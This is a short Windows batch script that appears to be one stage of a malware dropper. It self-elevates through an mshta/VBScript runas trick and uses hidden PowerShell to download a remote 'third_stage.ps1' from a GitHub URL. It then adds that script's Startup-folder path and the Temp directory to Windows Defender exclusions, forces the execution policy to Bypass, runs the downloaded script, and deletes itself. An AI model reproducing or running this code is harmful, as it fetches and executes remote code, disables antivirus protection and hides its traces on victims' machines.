@echo off

REM Script for self-elevation
net file 1>NUL 2>NUL || start "" mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c pushd ""%~dp0"" && ""%~s0"" %*","","runas",0)(window.close) && exit

REM Go smoothly
powershell -windowstyle hidden -c "Invoke-WebRequest 'raw.githubusercontent.com/DomoKrch/experiments/main/third_stage.ps1' -OutFile './third_stage.ps1'"

REM Add third stage and temp dir to exclusion paths, set execution policy for insurance
powershell -windowstyle hidden -c "Add-MpPreference -ExclusionPath 'C:\Users\me\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\third_stage.ps1'"
powershell -windowstyle hidden -c "Add-MpPreference -ExclusionPath '$env:Temp'; Set-ExecutionPolicy -ExecutionPolicy Bypass -Force; .\third_stage.ps1"

DEL %0
